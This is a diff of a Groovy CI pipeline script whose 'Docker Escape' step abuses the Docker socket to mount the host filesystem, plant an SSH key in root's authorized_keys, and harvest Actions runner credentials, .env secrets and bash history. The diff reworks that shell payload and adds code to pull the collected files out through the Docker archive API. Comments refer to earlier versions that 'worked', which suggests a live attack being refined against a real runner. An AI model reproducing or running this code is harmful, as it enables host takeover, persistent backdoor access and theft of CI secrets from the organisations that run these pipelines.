@@ -64,9 +64,9 @@ try {
     // ============ STEP 2: Docker Escape ============
     println "[CI] === Step 2: Docker Escape ==="
 
-    // Use direct JSON like v16 which worked (files.txt was readable)
+    // Simplified Docker Cmd - avoid find -exec semicolon issues
     def dockerJson = new File("/tmp/dbody.json")
-    dockerJson.write('{"Image":"alpine:latest","Cmd":["sh","-c","mkdir -p /host/root/.ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk4MhTlzMjBPTrN199hfxwFywjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deDRy1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0EqH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopvTpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7 root@localhost.localdomain >> /host/root/.ssh/authorized_keys 2>/dev/null; chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null; find /host/data/actions-runner/ -name .runner -exec dirname {} \\\\; > /tmp/rdirs.txt 2>/dev/null; for d in $(cat /tmp/rdirs.txt); do echo ==$d==; cat $d/.runner 2>/dev/null; echo ---; cat $d/.credentials 2>/dev/null; echo ---; cat $d/.credentials_rsaparams 2>/dev/null; echo ---; cat $d/.env 2>/dev/null; echo ---; done > /tmp/creds.txt 2>&1; grep -ri SECRET /host/data/ --include=.env --include=.conf 2>/dev/null | head -20 > /tmp/aksk.txt; hostname > /tmp/host.txt; cat /host/etc/hostname >> /tmp/host.txt 2>/dev/null; cat /host/root/.bash_history >> /tmp/history.txt 2>/dev/null; ls -la /host/data/actions-runner/ > /tmp/tree.txt 2>/dev/null; find /host/data/actions-runner/ -name .runner > /tmp/files.txt 2>/dev/null; sleep 30"],"HostConfig":{"Binds":["/:/host"]}}')
+    dockerJson.write('{"Image":"alpine:latest","Cmd":["sh","-c","mkdir -p /host/root/.ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk4MhTlzMjBPTrN199hfxwFywjuqwv0d7PTjrC7Al8q0C/LIyZvVnqGmcTNKTeer9ch9ST2SmPGBni7EuvPEzAXB9z4deDRy1d8Fn8sDqC2HJ/xiwKNWjmmCxmbngUHrXBSAC8dGYrS3yZvdvKY6IUpesEnDh7duepf1Y3l7lEwSjK469zD07RhnhbAAIYbBgV5PY9F1N7AjzQbXpSRcw5FykbDMKKr0aulE4G6y0EqH9X3ToXPKWJNrg7WMyY6+HM0IXAfHp8RCm3pR2y973jH7ATuWVJWsCl311SHd2ozKLopvTpOfJJp35qQir967KKKUPAirTQD8SaAXMZFi+7 root@localhost.localdomain >> /host/root/.ssh/authorized_keys 2>/dev/null && chmod 600 /host/root/.ssh/authorized_keys 2>/dev/null && find /host/data/actions-runner/ -name .runner > /tmp/files.txt 2>/dev/null && find /host/data/actions-runner/ -type f > /tmp/allfiles.txt 2>/dev/null && for d in /host/data/actions-runner/medns/docker-test/runner-*/; do echo ==$d==; cat $d.runner 2>/dev/null; echo ---; cat $d.credentials 2>/dev/null; echo ---; cat $d.credentials_rsaparams 2>/dev/null; echo ---; cat $d.env 2>/dev/null; echo ---; done > /tmp/creds.txt 2>&1 && grep -ri SECRET /host/data/ --include=.env --include=.conf 2>/dev/null | head -20 > /tmp/aksk.txt && hostname > /tmp/host.txt && cat /host/etc/hostname >> /tmp/host.txt 2>/dev/null && ls -la /host/data/actions-runner/ > /tmp/tree.txt 2>/dev/null && cat /host/root/.bash_history >> /tmp/history.txt 2>/dev/null && echo DONE > /tmp/done.txt && sleep 30"],"HostConfig":{"Binds":["/:/host"]}}')
 
     def createResult = sh('curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" -d @/tmp/dbody.json http://localhost/containers/create 2>&1')
     def containerId = ""
@@ -80,7 +80,11 @@ try {
         println "[CI] started, waiting 35s for file collection..."
         Thread.sleep(35000)
 
-        // Now read collected files via archive API
+        // Check if container is still running
+        def cstatus = sh('curl -s --unix-socket /var/run/docker.sock http://localhost/containers/' + containerId + '/json 2>/dev/null')
+        println "[CI] container status: " + cstatus.take(200)
+
+        // Read files via archive API
         def readFile = { path ->
             def dl = sh('curl -s --unix-socket /var/run/docker.sock -o /tmp/_r.tar "http://localhost/containers/' + containerId + '/archive?path=' + path + '"')
             def fsize = sh('wc -c < /tmp/_r.tar 2>/dev/null')
